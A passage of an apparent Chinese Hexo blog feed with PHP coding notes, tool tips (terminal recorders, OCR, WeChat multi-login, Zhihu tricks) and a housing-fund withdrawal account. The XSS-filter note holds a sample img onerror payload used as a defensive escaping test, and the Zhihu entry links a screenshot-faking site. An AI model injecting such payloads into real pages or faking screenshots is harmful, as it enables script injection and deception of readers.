max-age=0');//强制每次请求直接发送给源服务器，而不经过本地缓存版本的校验。 $objWriter = \PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007'); $objWriter-&gt;save('php://output'); //文件通过浏览器下载 exit;&#125;表数据限制：Excel 2003 及以下的版本。一张表最大支持 65536 行数据，256 列。Excel 2007-2010 版本。一张表最大支持 1048576 行，16384 列。 /** * 导出CSV数据处理 * 待优化项：如果导出数据达到百万以上，需要做分批导出CSV文件再添加到压缩文件统一打包下载 * @desc 数据导出到csv(csv文件) * @param string $filename 文件名称 * @param array $tileArray 所有列名称 * @param array $dataArray 所有列数据 */ function exportToCsv($filename, $tileArray=array(), $dataArray=array())&#123; //设置PHP最大单线程的独立内存使用量 ini_set('memory_limit','1024M'); //程序超时设置设为不限时 ini_set('max_execution_time ','0'); ob_end_clean(); ob_start(); header("Content-Type: text/csv"); $filename .= date("Y-m-d").".csv"; header("Content-Disposition:filename=".$filename); $fp=fopen('php://output','w'); fwrite($fp, chr(0xEF).chr(0xBB).chr(0xBF));//转码 防止乱码 fputcsv($fp,$tileArray); $index = 0; foreach ($dataArray as $item) &#123; if($index==1000)&#123; $index=0; ob_flush(); flush(); &#125; $index++; fputcsv($fp,$item); &#125; ob_flush(); flush(); ob_end_clean(); &#125; public function exportexcel()&#123; $sqlWhere = session('H5OPERATIONLOG_TIME_WHERE'); $data = M(self::T_TABLE)-&gt;where('create_time'.$sqlWhere)-&gt;select(); foreach ($data as $key =&gt; $row) &#123; $data[$key]['create_time'] = $row['create_time']."\t";//加"\t"形成文本格式，原样输出 &#125; $filename="XXXXX";//导出文件名 $headArr=array("XXX","XXX1","XXX2");//数据头 exportToCsv($filename,$headArr,$data); &#125; &lt;td&gt;&lt;a href="你的exportexcel访问路径"&gt;&lt;input type="button" value="导出Excel"&gt;&lt;/input&gt;&lt;/a&gt;&lt;/td&gt; 当您打开一个文本文件、 CSV 文件和文件的前两个字符是大写字母 "I"，"D" 时，会发生此问题。https://learnku.com/articles/32164 使用双向链表12345678910111213141516171819202122232425262728293031323334353637383940414243444546class MyList&#123; /** @var Node $head */ public $head; /** @var Node $tail */ public $tail; public function __construct() &#123; $this-&gt;head = null; $this-&gt;tail = null; &#125; public function remove($data) &#123; ... $prev = $this-&gt;head; $cur = $prev-&gt;next; while (!empty($prev) &amp;&amp; !empty($cur)) &#123; if ($cur-&gt;data == $data) &#123; $this-&gt;removeHelper($prev, $cur); break; &#125; $prev = $prev-&gt;next; $cur = $cur-&gt;next; &#125; &#125; private function removeHelper($prev, $cur) &#123; if ($cur == $this-&gt;tail) &#123; $this-&gt;tail = $prev; &#125; $prev-&gt;next = $cur-&gt;next; &#125; public function append($data) &#123; $n = new Node($data); ... &#125;&#125;https://learnku.com/articles/32281 守护进程12345678910111213141516171819202122232425262728293031323334353637383940fork 子进程父进程退出设置新的会话重置文件掩码关闭标准输入输出function daemon() &#123; $pid = pcntl_fork(); // fork 失败 if ($pid &lt; 0) &#123; exit('fork failed'); &#125; else if ($pid &gt; 0) &#123; // 退出父进程 exit(0); &#125; // 设置新的会员 // setsid 有几个注意点 // 不能是进程组的组长调用 // 对于进程组组员调用会产生新的会话和进程组，并成为该进程组的唯一成员，调用的进程将脱离终端 if (posix_setsid() &lt; 0) &#123;// 获取进程ID exit('set sid failed'); &#125; // 重置文件掩码 umask(0); // 切换工作目录 chdir('/'); // 关闭标准输入输出 fclose(STDIN); fclose(STDOUT); fclose(STDERR);&#125;global $stdin, $stdout, $stderr;$stdin = fopen('/dev/null', 'r');$stdout = fopen('/www/php/txt.txt','wb');$stderr = fopen('/dev/null', 'wb');https://learnku.com/articles/32320 如何获得每个父母的 N 个相关模型1https://softonsofa.com/tweaking-eloquent-relations-how-to-get-n-related-models-per-parent/ 防止 XSS 注入123456789101112131415161718192021222324252627282930htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签class XSSFilter&#123; public function handle($request, Closure $next) &#123; // 配置不执行过滤转换参数项，如 env 配置: XSS_EXCEPT=article_contents,html_contents $param_except_string = config('const.xss_filter_param_except'); $param_except = []; if (!empty($param_except_string)) &#123; $param_except = explode(',', $param_except_string); &#125; $input = $request-&gt;except($param_except); array_walk_recursive($input, function (&amp;$input) &#123; // $input = strip_tags($input); // 清除标签内容 $input = htmlspecialchars($input, ENT_NOQUOTES, 'UTF-8', false); // 过滤转换预定符号 &#125;); $request-&gt;merge($input); return $next($request); &#125;&#125;function p($value) &#123; return htmlspecialchars($value, ENT_QUOTES, 'UTF-8', false);&#125;$nickname = "&lt;img src='x' onerror='alert(0)' /&gt;测试昵称";echo p($nickname);修改 php.ini 配置开启 httpOnly: Session.cookie_httponly = On开启 httpOnly 后，禁止 JavaScript 脚本直接读取该 Cookie 内容cookie($name = null, $value = null, $minutes = 0, $path = null, $domain = null, $secure = false, $httpOnly = true)https://learnku.com/articles/32529 PHP 使用 Redis 实现分页123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121namespace app\Constants\Nomal;use Illuminate\Support\Facades\Cache;use Illuminate\Support\Facades\Redis;class RedisList&#123; // 添加一条数据到redis中 public function zAdd($key,array $value)&#123; return Redis::zadd($key,$value); &#125; // 从Redis返回一条数据 public function zRange($key,$start,$end,$withScores)&#123; return Redis::zRange($key,$start,$end,$withScores); &#125; // Redis 返回一条数据从大小返回数据 public function zrevRange ($key,$start,$end,$withScores)&#123; return Redis::ZREVRANGE($key,$start,$end,$withScores); &#125; // Redis 返回某个数据 按分数正序排序 //ZRANGEBYSCORE public function zRangByScore($key,$start,$end,$withScores)&#123; return Redis::ZRANGEBYSCORE($key,$start,$end,$withScores); &#125; // Redis 返回数据按分数倒叙排序 // ZREVRANGEBYSCORE public function zRevRangBySore($key,$start,$end,$withScores)&#123; return Redis::ZREVRANGEBYSCORE($key,$start,$end,$withScores); &#125; // 删除某个成员的值 public function zRem($key,$member)&#123; return Redis::zRem($key,$member); &#125; // 返回zset集合中所有元素的个数 public function zSize($key)&#123; return Redis::zcard($key); &#125; // 返回比元素$member分数大的元素的个数 public function zRevRank($key,$member)&#123; return Redis::zRevRank($key,$member); &#125; // 如果在名称为key的zset中已经存在元素member，则该元素的score增加increment；否则向集合中添加该元素，其score的值为increment public function zIncrBy($key,$increment,$member)&#123; return Redis::zIncrBy($key,$increment,$member); &#125; // 求有序集合的并集 public function zUnion($output,$zsetkey)&#123; return Redis::zUnion($output,$zsetkey); &#125; //求有序集合的交集 public function zInter($output,$zsetkey)&#123; return Redis::zInter($output,$zsetkey); &#125; // redis 分页处理 public function limitAndPage($pageIndex,$pageNum)&#123; return array('pageIndex'=&gt;$pageIndex-1,'pageNumber'=&gt;$pageIndex*$pageNum-1); &#125; // redis 队列操作 入队列 public function lPush($key,$value)&#123; return Redis::LPUSH($key,$value); &#125; // redis 根据索引取数据 public function lIndex($key,$position)&#123; return Redis::lIndex($key,$position); &#125; // redis list维护一个长度为100000的队列 public function lTrim($key,$start=0,$stop=100000)&#123; return Redis::lTrim($key,$start,$stop); &#125; // 设置key的过期时间 现在设置的是一个月的时间 做二级缓存使用 public function expire($key,$timesec =0)&#123; if($timesec == 0)&#123; $expire_time = 0&lt;$timesec? $timesec: strtotime(date('Y-m-d')) + 2592000 - time(); &#125;else&#123; $expire_time = $timesec; &#125; return Redis::expire($key,$expire_time); &#125; // 设置zset的长度 public function SetZsetTime($key,$data,$lenth =4)&#123; if($this-&gt;zSize($key)&gt;$lenth)&#123; Redis::zremrangebyrank($key,0,count($data)-1); &#125; &#125; public function getListInfoByCondition($key,$start,$end,array $limit,$sort = 'asc')&#123; if($sort == 'desc')&#123; $pageNum = $limit['limit'][0]*$limit['limit'][1]; $limit['limit'][0] = $this-&gt;zSize($key)-$pageNum; // 本方法只使用于app分页 上一页 下一页 不支持跳页查询 &#125; return $sort == 'desc'?array_reverse($this-&gt;zRangByScore($key,$start,$end,$limit)):$this-&gt;zRangByScore($key,$start,$end,$limit); &#125; // 添加一条数据 public function addOneInfo($key,array $data)&#123; if(Redis::exists($key))&#123; if(count($data)&gt;4)&#123; return false; &#125; $ret = $this-&gt;zAdd($key,$data); $this-&gt;SetZsetTime($key,$data); return $ret; &#125;else&#123; $this-&gt;expire($key,60); return $this-&gt;zAdd($key,$data); &#125; &#125; // 更新一条数据 public function updateOneById($key,$id,$data)&#123; $this-&gt;deleteOneById($key,$id); return $this-&gt;zAdd($key,$data); &#125; // 删除一条数据 public function deleteOneById($key,$id)&#123; return Redis::zremrangebyscore($key,$id,$id); &#125; // 获取一条数据 public function getOneInfoById($key,$id)&#123; return $this-&gt;zRangByScore($key,$id,$id,array('withScores'=&gt;'')); &#125;&#125;https://learnku.com/articles/32548 繁体简体互转123456789101112131415https://github.com/BYVoid/OpenCCcomposer require sleep-cat/opencc-phpuse SleepCat\OpenCC\Command;use SleepCat\OpenCC\OpenCC;$command = new Command('/usr/bin/opencc','/usr/share/opencc');$opencc = new OpenCC($command);// laravel应用可用外观$result = OpenCC::transform('天氣乍涼人寂寞，光陰須得酒消磨。且來花裏聽笙歌。','t2s.json')// 其他应用使用实例$result = $opencc-&gt;transform('天氣乍涼人寂寞，光陰須得酒消磨。且來花裏聽笙歌。','t2s.json');print_r($result);// 天气乍凉人寂寞，光阴须得酒消磨。且来花里听笙歌。https://learnku.com/articles/32497 接入 paypal PHP-sdk 支付 / 回调 / 退款全流程 PHP 三年模拟五年面试 phpredis 扩展redis使用 数据库主键 ID 生成策略 PHP 生成迷宫路线 JavaScript 混淆表达式https://jscrew.it/ PHP 生成迷宫路线 PHP 手册入门视频教程 phpstorm 下安装 Laravel-ide-helper 个人收款支付接口 数据结构复杂图形存储 PHP 版 第十届全国大学生信息安全竞赛Web WriteUp 解决微博图床防盗链的问题 Jenkins 自动化发布 PHP 项目 SQL注入备忘手册 PHP 面试详解之技术篇 PHP安全 将汉字转化为拼音 pack、unpack自制二进制“数据库” 小程序模板消息 Workerman 作为 Laravel 队列进程守护 Laravel-Horizon【队列监控】 PHP 拼接微信好友头像https://github.com/moxun33/imageMergerUtil/blob/master/MergeImage.class.php PHP 优秀资源库整理 PHP 问答系统 Laravel 中使用 极光推送jpush composer包 PHP常用函数整理 笔记分享 | 简书2GitHub PHP 中文简易分词 PHP the right way 用PHP玩转进程之二 — 多进程PHPServer 后端来配置 Vue Router 的方案 爬虫工具 我用php爬虫一天时间“偷了”知乎一百万用户 ngrok 实现内网穿透ittun.com/]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行录制工具 asciinema]]></title>
    <url>%2F2019%2F07%2F09%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BD%95%E5%88%B6%E5%B7%A5%E5%85%B7-asciinema%2F</url>
    <content type="text"><![CDATA[平常出bug求助的时候有时候贴代码或者截图往往不直观，如果能重现给对方看就好了，这里推荐 2 个命令行的录制工具。 asciinema网站https://asciinema.org/，github主页https://github.com/asciinema直接使用 pip install asciinema来安装。 执行asciinema rec 开始录制,录制完成后 exit 退出，可以保存到本地或者上传到 https://asciinema.org 。12345678910111213141516171819202122232425262728293031323334[root@VM_0_14_centos ~]# asciinema recasciinema: recording asciicast to /tmp/tmp1ua5a2rx-ascii.castasciinema: press &lt;ctrl-d&gt; or type "exit" when you're done[root@VM_0_14_centos ~]# pwd/root[root@VM_0_14_centos ~]# cd /usr/share/nginx/html/[root@VM_0_14_centos html]# pip install asciinemaDEPRECATION: Python 3.4 support has been deprecated. pip 19.1 will be the last one supporting it. Please upgrade your Python as Python 3.4 won't be maintained after March 2019 (cf PEP 429).Looking in indexes: http://mirrors.tencentyun.com/pypi/simpleRequirement already satisfied: asciinema in /usr/lib/python3.4/site-packages (2.0.2)You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos html]# pip list |grep asciiDEPRECATION: Python 3.4 support has been deprecated. pip 19.1 will be the last one supporting it. Please upgrade your Python as Python 3.4 won't be maintained after March 2019 (cf PEP 429).asciinema 2.0.2You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos html]# exitexitasciinema: recording finishedasciinema: press &lt;enter&gt; to upload to asciinema.org, &lt;ctrl-c&gt; to save locallyView the recording at: https://asciinema.org/a/AdnqMX0QfOg5c7USOtwHZ4Hz1This installation of asciinema recorder hasn't been linked to any asciinema.orgaccount. All unclaimed recordings (from unknown installations like this one)are automatically archived 7 days after upload.If you want to preserve all recordings made on this machine, connect thisinstallation with asciinema.org account by opening the following link: https://asciinema.org/connect/01fb0f0e-c56a-450f-80ac-4020188dd957 录制过程在https://asciinema.org/a/AdnqMX0QfOg5c7USOtwHZ4Hz1 可以看到了。 如果分享给他人可以用邮箱注册，它不需要密码就可以注册。我注册后的主页https://asciinema.org/~susheng然后打开这个链接 https://asciinema.org/connect/01fb0f0e-c56a-450f-80ac-4020188dd957 就会保存到你账号下。设置为public 后可生成公开链接，可分享给他人观看，还可以嵌入到自己的网站。视频链接后加 .png 是视频截图 https://asciinema.org/a/254348.png ，而链接后加 .js 就可以直接嵌入网站了。 12&lt;a href="https://asciinema.org/a/254348" target="_blank"&gt;&lt;img src="https://asciinema.org/a/254348.svg" /&gt;&lt;/a&gt;&lt;script src="https://asciinema.org/a/254348.js" id="asciicast-254348" async data-autoplay="true" data-size="big"&gt;&lt;/script&gt; TermRecordTermRecord也是用 pip 安装 pip install TermRecord, 直接开始录制 TermRecord -o termrecord.html输入 exit 结束录制 。这个 termrecord.html 就是录制生成的文件，可以直接用浏览器打开。12345678910111213141516171819202122[root@VM_0_14_centos html]# TermRecord -o termrecord.htmlScript started, file is /tmp/tmpdekpz_p2[root@VM_0_14_centos html]# pwd/usr/share/nginx/html[root@VM_0_14_centos html]# whoamiroot[root@VM_0_14_centos html]# pip install TermRecordDEPRECATION: Python 3.4 support has been deprecated. pip 19.1 will be the last one supporting it. Please upgrade your Python as Python 3.4 won't be maintained after March 2019 (cf PEP 429).Looking in indexes: http://mirrors.tencentyun.com/pypi/simpleRequirement already satisfied: TermRecord in /usr/lib/python3.4/site-packages (1.2.5)Requirement already satisfied: Jinja2&gt;=2.6 in /usr/lib64/python3.4/site-packages (from TermRecord) (2.10.1)Requirement already satisfied: MarkupSafe&gt;=0.23 in /usr/lib64/python3.4/site-packages (from Jinja2&gt;=2.6-&gt;TermRecord) (1.1.1)You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos html]# pip list|grep TermDEPRECATION: Python 3.4 support has been deprecated. pip 19.1 will be the last one supporting it. Please upgrade your Python as Python 3.4 won't be maintained after March 2019 (cf PEP 429).TermRecord 1.2.5You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos html]# exitexitScript done, file is /tmp/tmpdekpz_p2 然后打开文件就可以看到录制过程了 http://118.24.158.116:8888/termrecord.html 另外还有个基于ruby的showterm和termtosvg就不演示了 http://showterm.io/ https://github.com/nbedos/termtosvg 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的 ocr 图片文字识别工具]]></title>
    <url>%2F2019%2F07%2F08%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84-ocr-%E5%9B%BE%E7%89%87%E6%96%87%E5%AD%97%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[有时候网上看到一张图片，比如电影截图，里面有台词，想把台词复制出来，这时候你可能会照着图片中的文字，手动打出来，但如果文字太多或者一篇文章，这样你会崩溃的，这时候你就需要ocr了。 ocr是种光学字符识别技术，可以识别软件将图像中的文字转换成文本格式，这里推荐几种好用的ocr软件。 这里以电影《不能说的秘密》这张图片为例子，ps：如果想看这部电影公众号回复 不能说的秘密 获取。 图中的文字为：12我能遇见你已经是很不可思议了Being able to meet you has been incredible 天若OCRhttps://tianruoocr.cn/ 打开软件，双击截取需要识别的区域就好了，速度很快，效果可以。 软件下载地址 公众号回复 ocr 获取。 黑洞OCR打开软件，很小巧。点击选取需要截图的区域，它会默认打开一个文件显示识别的内容。软件下载地址 公众号回复 ocr 获取。 另外一款跨平台的树洞 OCR 小工具 https://github.com/AnyListen/tools-ocr 白描白描，像猫一样灵动的ocr扫描识别神器。具备高准确度的文字识别、表格识别转Excel、批量识别、识别后翻译、文件扫描等功能。网站https://baimiao.uzero.cn/ 这是个APP，我是不喜欢用APP的，有兴趣自己安装试试。 在线识别网站 https://gongpeione.github.io/quick-js-ocr/example/打开网站直接上传图片或者粘贴图片等待一会就好，效果非常不错，没有一个错字。 类似的网站还有http://www.gkocr.com/web/index.html https://github.com/naptha/tesseract.js https://ocr.wdku.net/ 取字这是一个Chrome扩展 http://willingstudio.com/#install 还是开源的 https://github.com/willing-Studio/willing-studio.github.io/ 经常刷微博可以看到这种长图，直接右键选择取字，真的方便。 小程序微软 ai 识图，支持拍照识别，上传图片，或者直接从微信聊天记录查找图片来识别，效果如下。 其他类似的小程序还有 以图识字 ，讯飞快读，腾讯翻译君 。 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在电脑上登陆多个微信]]></title>
    <url>%2F2019%2F07%2F08%2F%E5%A6%82%E4%BD%95%E5%9C%A8%E7%94%B5%E8%84%91%E4%B8%8A%E7%99%BB%E9%99%86%E5%A4%9A%E4%B8%AA%E5%BE%AE%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[电脑上习惯登录好几个QQ，像这样的。 但pc端的微信软件默认只能登录一个微信，如果有多个微信怎么办呢？ 微信网页版微信除了pc端的软件还有个微信网页版，地址是 https://wx.qq.com/ ，打开几个浏览器就能登录几个微信，一个浏览器当然也可以，开启隐身模式，见之前的文章那些你可能不知道的浏览器奇技淫巧 。登录后还可以查看公众号文章。 如果你觉得网页版样式不好看，可以安装个Chrome扩展把网页微信伪装成云笔记 https://github.com/YGYOOO/WeChat-Shelter使用后的效果 命令行微信网页版虽然可以用，但是切换浏览器麻烦，而且不保存聊天记录，关闭后再登录就没有记录了。所以还是用pc端的软件比较好，它能保存所有聊天记录，图片和视频。 那如何能在pc端登录多个微信呢？ 首先右击桌面的微信快捷方式，找到微信的安装目录，比如我的。 安装路径为 D:\wechat\WeChat.exe，将路径D:\wechat添加到环境变量。 打开命令行执行wechat &amp; wechat &amp; wechat就可以打开3个微信了。 批处理如果觉得这样麻烦新建个批处理文件 wechat.bat12start "D:\wechat\WeChat.exe"start "D:\wechat\WeChat.exe" 先关闭登录的微信，然后双击wechat.bat就可以登录2个微信了。登录后的效果。 win10应用商店如果你用的win10，还可以在应用商店安装微信 For Windows 地址 https://www.microsoft.com/zh-cn/p/%e5%be%ae%e4%bf%a1-for-windows/9nblggh4slx7?activetab=pivot:overviewtab 这样有了2个软件就可以登录2个微信了。 除了上面这些方法还有第三方软件https://github.com/anhkgg/SuperWeChatPC 下载地址 https://raw.githubusercontent.com/anhkgg/SuperWeChatPC/master/bin/v1.1.3.zip这个支持登录多个微信，还能消息防撤回，语音备份等。mac系统推荐https://github.com/Sunnyyoung/WeChatTweak-macOS下载源码后sudo make install就好了。推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的知乎奇技淫巧]]></title>
    <url>%2F2019%2F07%2F01%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%9F%A5%E4%B9%8E%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[这是奇技淫巧系列第 8 篇文章，有兴趣点下面链接看之前的文章。 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 知乎是国内活跃的问答社区，相信很多人经常玩，今天说说你可能不知道的知乎。 知乎历史热榜知乎的热榜只有当天的，比如今天6月30的 https://www.zhihu.com/hot如果想看历史热榜推荐读知乎http://duzhihu.cc/history 如果你想看其他热榜，推荐 Tophub.today ，具体查看之前文章 上班摸鱼好去处 手机端显示所有回答在微信或者手机浏览器打开知乎问题，如果要显示全部答案，需要下载APP，比如这个问题 https://www.zhihu.com/question/330840262 如果你不想下载APP怎么办？在域名里加上vvv就成了https://www.zhihuvvv.com/question/330840262 ,然后打开效果如下，打开APP变成了查看更多回答。 除了查看知乎全部回答， 还可以查看商品历史价格，比如 https://detail.tmall.com/item.htm?id=527080261251 添加vvv后变为https://detail.tmallvvv.com/item.htm?id=527080261251 它还支持淘宝，京东，当当等网站，有兴趣可以看看。 下载知乎视频这个在之前的文章已经提到过了，那些你可能不知道的视频下载奇技淫巧,安装一键视频下载器 https://chrome.google.com/webstore/detail/one-click-video-downloade/bhepgcoaibmmehlmckhlmbdgcemhidcg?hl=zh-CN 点击浏览器右上角一键视频下载器按钮，直接点击下载。 也可以安装油猴插件https://greasyfork.org/zh-CN/scripts/39206-%E4%B8%8B%E8%BD%BD%E7%9F%A5%E4%B9%8E%E8%A7%86%E9%A2%91 ，具体安装方法见那些你可能不知道的免费观看 VIP 视频奇技淫巧。 知乎极速版随着功能不断增加，APP的安装包越来越大，比如微信，但其实很多功能我们用不上，于是很多应用都推出了极速版，知乎也有，不知道微信会不会出。 安卓在应用宝里搜 知乎极速版 可以搜到，只有13.4M，而完整版有43M，下载链接 http://a.app.qq.com/o/simple.jsp?pkgname=com.zhihu.android.lite&amp;from=singlemessage 伪造知乎截图 https://fakes.netlify.com/#/zhihu 这个一个伪造知乎，微博等网站截图的网站。点击文字就可以编辑，我就不要脸的编辑了下。 知乎高赞https://www.zhihu.com/topic/19776749/top-answers 这是知乎的根话题，这里可以看到全站的高赞回答，都是上百k的赞数。通过话题结构，可以找到你感兴趣的话题。 知乎助手知乎助手可以下载用户的全部回答，比如输入知乎用户的个人主页 执行完毕后会打开电子书所在文件夹，直接用浏览器打开html下的index.html就行。 还支持下载收藏夹，专栏，话题，下载地址 https://pan.baidu.com/s/1vn-96AlHPKsggSzemVKiEg，而且这个工具是开源的，见 https://github.com/YaoZeyuan/zhihuhelp_with_node 快捷键这个只有pc端才有，按?就会弹出。查看回答的时候按v如同点赞（在APP端双击也会点赞，我也是偶然发现的），按j看下一个回答等。 资源 快速聚合查看各大搜索引擎网页快照的工具 http://his.sh/优雅地玩知乎 https://github.com/CheezOne/ZhihuVAPI知乎收藏夹：http://www.zhihu.com/question/19926207优秀个人：http://www.zhihu.com/question/20237807将互联网保存到IPFS https://github.com/picasso250/zhihu-archive知乎最高赞？如何求证和索引？https://magnet.chongbuluo.com/thread-5429-1-1.html?_dsign=f1edfa17 ps:我建了个免费的星球，经常分享些有用好玩的东西，已经发布了近100个主题了，有兴趣的话用微信扫码进入。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上班摸鱼好去处]]></title>
    <url>%2F2019%2F07%2F01%2F%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E5%A5%BD%E5%8E%BB%E5%A4%84%2F</url>
    <content type="text"><![CDATA[现在各种资讯网站那么多，微博，知乎，头条，公众号等等，打开一个个APP或网站，一来浪费时间，二来也麻烦，这里推荐一些聚合网站，一个网站聚合这些网站的热榜，不怕再错过热点了。 今日热榜https://tophub.today/微博，百度，知乎，微信热榜一网打尽，打开链接跳转到对应网站。选择下娱乐版块,b站，抖音，豆瓣都有 。今日热榜除了网站，还有APP https://tophub.today/app 果汁排行榜各种热搜榜，影视榜，音乐榜等等。http://guozhivip.com/rank/ welovebuyhttps://read.welovebuy.com/微博，简书，知乎 历史热榜上面都是当天的热榜，如果想看过去的怎么办呢？比如知乎的今日热榜有个网站读知乎记录了知乎的历史热榜http://duzhihu.cc/history比如6.27的热榜http://duzhihu.cc/date/2019-06-27对应还有微博历史热搜 https://www.enlightent.cn/research/rank/weiboSearchRank选择对应日期的热搜比如6月29的热搜 其他：历史上的今天http://top.todayonhistory.com/rsb/ mrcuriosity http://hot.mrcuriosity.org/?site_id=2摸鱼神器 https://github.com/cteams/Thief-Book微博热搜https://s.weibo.com/top/summary?cate=realtimehot&amp;sudaref=www.google.com百度热榜http://top.baidu.com/buzz?b=1可以给任何奇奇怪怪的内容生成 RSS 订阅源 https://docs.rsshub.app/readhub https://readhub.cn/topicsprintf520 https://www.printf520.com/hot.html比格张https://bigezhang.com/news/zhihu 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何提取公积金 9 天到账]]></title>
    <url>%2F2019%2F06%2F28%2F%E5%A6%82%E4%BD%95%E6%8F%90%E5%8F%96%E5%85%AC%E7%A7%AF%E9%87%91-9-%E5%A4%A9%E5%88%B0%E8%B4%A6%2F</url>
    <content type="text"><![CDATA[眼看着北京房价蹭蹭往上涨，大多数像我一样的北漂是买不起了。 怎么办呢？于是今年年初在老家买房了。 公积金网站查询既然买好了房，就想着把公积金也提了，放在账户里也是浪费。具体公积金账户信息可以登录北京公积金网站，前提是先去银行办理个公积金联名卡，我用的是招行的。http://www.bjgjj.gov.cn/web/index/grxxcx/index.html 可以看到每个月公司缴的公积金历史记录。 支付宝查询登录这个网站太麻烦了，还可以绑定你的支付宝信息，就可以直接用支付宝登录查看了。 提取方法由于在前公司办理过租房支取，就是每个月1500,3个月4500一次打到你的公积金联名卡。问了下同事还有其他支取方式没有，原来公司网站上就有公积金支取的流程，如果你们公司没有内部网站查看相关信息，可以问下 hr。新浪口袋APP上也有。 租房支取比较简单，申请下就能取了。 我需要的是购房支取，北京和外地买房还不一样。 于是端午回家把资料都拿过来了，就是 《贷款合同》原件， 《购房合同》，《购房发票》原件，身份证原件这些，网签合同编号和密码我没提供。 申请需要在指定时间内提交的，我在6月12号提交当天就通过了。 然后找hr提交发票填写资料，第一次会把所有钱打你卡上，之后每 3 个月一次打。 除了在公司申请支取，还可以直接销户取，不过之后还要在北京缴公积金需要把钱还回去。。。 新浪办事效率还挺快的，12号申请，昨天21号就到账了，一下子多了7万多（也没多少钱就不打码了），还是很开心的。 所以我决定来发个红包，公众号内回复 红包 领取，端午节的时候已经发过一次了。 这就是我在北京的公积金支取流程，可能其他城市不一样，据说广东可以直接在公众号 粤省事 里直接办理。 你所在的城市是怎么提取的？你有提取过吗？ 可以在下方评论交流下。 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>公积金</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链相关]]></title>
    <url>%2F2019%2F06%2F27%2F%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9B%B8%E5%85%B3%2F</url>
